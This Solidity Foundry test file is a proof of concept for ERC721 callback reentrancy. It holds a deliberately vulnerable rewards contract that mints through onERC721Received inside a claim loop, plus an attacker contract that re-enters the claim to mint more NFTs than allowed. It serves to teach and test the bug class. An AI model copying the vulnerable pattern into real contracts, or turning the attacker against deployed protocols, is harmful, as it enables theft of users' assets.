// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @title ERC721 Callback Reentrancy PoC
/// @notice Demonstrates reentrancy via onERC721Received during reward claims

// Minimal ERC721 with safeMint
contract SimpleNFT {
    uint256 public nextId;
    mapping(uint256 => address) public ownerOf;
    
    function mint(address to) external returns (uint256) {
        uint256 id = nextId++;
        ownerOf[id] = to;
        // Safe mint: call onERC721Received
        if (to.code.length > 0) {
            (bool ok, bytes memory ret) = to.call(
                abi.encodeWithSignature(
                    "onERC721Received(address,address,uint256,bytes)",
                    msg.sender, address(0), id, ""
                )
            );
            require(ok, "callback failed");
        }
        return id;
    }
}

contract VulnerableRewards {
    SimpleNFT public nft;
    mapping(address => uint32) public claimed;
    mapping(address => uint32) public totalRewards;

    constructor(SimpleNFT _nft) { nft = _nft; }

    function setRewards(address u, uint32 r) external {
        totalRewards[u] = r;
    }

    function claimRewards() external {
        uint32 start = claimed[msg.sender];
        for (uint32 i = start; i < totalRewards[msg.sender]; i++) {
            claimed[msg.sender] += 1;
            nft.mint(msg.sender); // ❌ triggers callback → reentrant
        }
    }
}

contract ERC721Attacker {
    VulnerableRewards public target;
    uint256 public mintCount;

    constructor(VulnerableRewards _t) { target = _t; }

    function attack() external { target.claimRewards(); }

    function onERC721Received(address, address, uint256, bytes calldata)
        external returns (bytes4)
    {
        mintCount++;
        if (target.claimed(address(this)) < target.totalRewards(address(this))) {
            target.claimRewards(); // re-enter
        }
        return this.onERC721Received.selector;
    }
}

contract ERC721ReentrancyTest is Test {
    SimpleNFT nft;
    VulnerableRewards rewards;
    ERC721Attacker attacker;

    function setUp() public {
        nft = new SimpleNFT();
        rewards = new VulnerableRewards(nft);
        attacker = new ERC721Attacker(rewards);
        rewards.setRewards(address(attacker), 3);
    }

    function testERC721CallbackReentrancy() public {
        attacker.attack();
        // With reentrancy, attacker mints more NFTs than entitled
        assertGt(attacker.mintCount(), 3, "should mint more than 3 via reentrancy");
        assertGt(nft.nextId(), 3, "total NFTs minted should exceed reward count");
    }
}
